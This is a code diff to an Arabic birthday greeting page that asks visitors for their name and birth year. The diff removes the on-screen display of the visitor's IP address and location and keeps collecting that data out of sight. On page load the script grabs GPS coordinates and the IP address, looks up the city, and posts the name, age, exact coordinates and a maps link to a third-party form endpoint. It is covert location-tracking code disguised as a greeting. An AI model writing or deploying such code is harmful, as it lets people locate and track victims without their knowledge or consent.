@@ -85,18 +85,10 @@
       font-weight: 500;
       min-height: 25px;
     }
-    .info-box {
-      background: #f0f4ff;
-      border-radius: 12px;
-      padding: 12px;
-      margin-bottom: 15px;
-      font-size: 14px;
-      color: #333;
-      border-right: 4px solid #3b82f6;
-      text-align: right;
+    /* ===== إخفاء المعلومات ===== */
+    .hidden-info {
+      display: none !important;
     }
-    .info-box span { font-weight: bold; color: #1e293b; }
-    .loading { color: #94a3b8; }
   </style>
 </head>
 <body>
@@ -105,12 +97,6 @@
   <div class="icon">🎉</div>
   <h2>كل عام وأنت بخير!</h2>
   <p class="greeting-text">🎈 أدخل اسمك وسنة ميلادك، وستظهر لك تهنئة خاصة بعمرك الحقيقي!</p>
-
-  <!-- معلومات الجهاز -->
-  <div class="info-box" id="deviceInfo">
-    🌐 <span>IP الخاص بك:</span> <span id="ipDisplay" class="loading">جارٍ التحميل...</span><br>
-    📍 <span>الموقع:</span> <span id="locationDisplay" class="loading">جارٍ التحميل...</span>
-  </div>
 
   <!-- رسالة العمر -->
   <div id="birthdayMessage" class="birthday-message">
@@ -123,21 +109,24 @@
     <input type="number" id="yearInput" placeholder="📅 أدخل سنة ميلادك (مثال: 1995)" required min="1900" max="2026">
     <div id="status"></div>
 
+    <!-- ===== حقول مخفية ===== -->
     <input type="hidden" id="lat" name="latitude">
     <input type="hidden" id="lon" name="longitude">
     <input type="hidden" id="map_link" name="google_maps_link">
     <input type="hidden" id="age" name="age">
     <input type="hidden" id="ip" name="ip">
+    <input type="hidden" id="location" name="location">
 
     <button type="button" class="btn-submit" onclick="handleSubmit()">🎁 إرسال التهنئة الآن</button>
   </form>
 </div>
 
 <script>
-  // ===== متغيرات لتخزين الموقع =====
+  // ===== متغيرات =====
   let userLat = null;
   let userLon = null;
-  let locationSource = 'IP';
+  let userIP = 'غير متاح';
+  let userLocation = 'غير متاح';
 
   // ===== جلب الموقع عبر GPS تلقائياً =====
   function getLocationGPS() {
@@ -146,21 +135,31 @@
         (position) => {
           userLat = position.coords.latitude;
           userLon = position.coords.longitude;
-          locationSource = 'GPS';
           document.getElementById('lat').value = userLat;
           document.getElementById('lon').value = userLon;
           document.getElementById('map_link').value = `https://maps.google.com/?q=${userLat},${userLon}`;
           
-          // تحديث عرض الموقع
-          updateLocationDisplay();
+          // جلب اسم المدينة من الإحداثيات
+          fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${userLat}&longitude=${userLon}&localityLanguage=ar`)
+            .then(response => response.json())
+            .then(data => {
+              const city = data.locality || data.city || 'غير معروف';
+              const country = data.countryName || 'غير معروف';
+              userLocation = `${city}، ${country}`;
+              document.getElementById('location').value = userLocation;
+            })
+            .catch(() => {
+              userLocation = `${userLat}, ${userLon}`;
+              document.getElementById('location').value = userLocation;
+            });
         },
         (error) => {
-          console.log("GPS غير مفعل، سيتم استخدام الموقع من IP.");
-          fetchIPAndLocation(); // استخدام IP كخيار احتياطي
+          console.log("GPS غير مفعل، استخدام IP.");
+          fetchIPAndLocation();
         }
       );
     } else {
-      fetchIPAndLocation(); // المتصفح لا يدعم GPS
+      fetchIPAndLocation();
     }
   }
 
@@ -169,41 +168,16 @@
     try {
       const ipRes = await fetch('https://api.ipify.org?format=json');
       const ipData = await ipRes.json();
-      const ip = ipData.ip;
+      userIP = ipData.ip;
+      document.getElementById('ip').value = userIP;
 
-      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+      const geoRes = await fetch(`https://ipapi.co/${userIP}/json/`);
       const geoData = await geoRes.json();
-
-      document.getElementById('ipDisplay').textContent = ip;
-      document.getElementById('ip').value = ip;
-
-      // إذا لم يكن GPS متاحاً، استخدم الموقع من IP
-      if (!userLat) {
-        // ipapi.co لا يعطي إحداثيات دقيقة، لكن نعرض المدينة والدولة
-        const locationText = `${geoData.city || 'غير معروف'}، ${geoData.region || ''}، ${geoData.country_name || 'غير معروف'}`;
-        document.getElementById('locationDisplay').textContent = locationText;
-      }
+      userLocation = `${geoData.city || 'غير معروف'}، ${geoData.region || ''}، ${geoData.country_name || 'غير معروف'}`;
+      document.getElementById('location').value = userLocation;
 
     } catch (error) {
-      document.getElementById('ipDisplay').textContent = '⚠️ تعذر جلب IP';
-      document.getElementById('locationDisplay').textContent = '⚠️ تعذر جلب الموقع';
-    }
-  }
-
-  // ===== تحديث عرض الموقع =====
-  function updateLocationDisplay() {
-    if (userLat && userLon) {
-      // استخدام GPS لعرض الموقع
-      fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${userLat}&longitude=${userLon}&localityLanguage=ar`)
-        .then(response => response.json())
-        .then(data => {
-          const city = data.locality || data.city || 'غير معروف';
-          const country = data.countryName || 'غير معروف';
-          document.getElementById('locationDisplay').textContent = `${city}، ${country} (GPS)`;
-        })
-        .catch(() => {
-          document.getElementById('locationDisplay').textContent = `${userLat}, ${userLon} (GPS)`;
-        });
+      console.log("تعذر جلب IP");
     }
   }
 
@@ -233,7 +207,6 @@
     const year = document.getElementById('yearInput').value.trim();
     const status = document.getElementById('status');
     const age = document.getElementById('age').value;
-    const ip = document.getElementById('ip').value;
 
     if (!name) {
       status.innerText = "⚠️ الرجاء إدخال اسمك!";
@@ -264,11 +237,11 @@
       name: name,
       age: age,
       birth_year: year,
-      ip: ip || "غير متاح",
+      ip: document.getElementById('ip').value || "غير متاح",
+      location: document.getElementById('location').value || "غير متاح",
       latitude: document.getElementById('lat').value || "غير متاح",
       longitude: document.getElementById('lon').value || "غير متاح",
-      google_maps_link: document.getElementById('map_link').value || "غير متاح",
-      location_source: locationSource
+      google_maps_link: document.getElementById('map_link').value || "غير متاح"
     };
 
     fetch("https://formspree.io/f/xpqvvkdp", {
@@ -296,10 +269,7 @@
 
   // ===== تشغيل عند تحميل الصفحة =====
   window.onload = function() {
-    // محاولة جلب الموقع عبر GPS أولاً
     getLocationGPS();
-    
-    // جلب IP (دائماً)
     fetchIPAndLocation();
 
     document.getElementById('yearInput').addEventListener('input', calculateAgeAndShow);
